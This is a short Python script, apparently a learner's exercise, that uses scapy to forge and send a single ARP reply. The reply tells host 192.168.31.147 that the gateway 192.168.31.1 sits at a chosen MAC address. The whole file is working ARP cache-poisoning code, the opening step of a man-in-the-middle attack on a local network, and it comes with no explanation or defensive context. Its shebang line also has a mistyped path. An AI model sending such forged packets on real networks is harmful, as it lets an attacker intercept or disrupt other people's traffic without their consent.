# !/user/bin/python3
import scapy.all as scapy

paket = scapy.ARP(
    op=2,
    pdst="192.168.31.147",
    hwsrc="88:78:73:30:1C:95",
    psrc="192.168.31.1")

scapy.send(paket)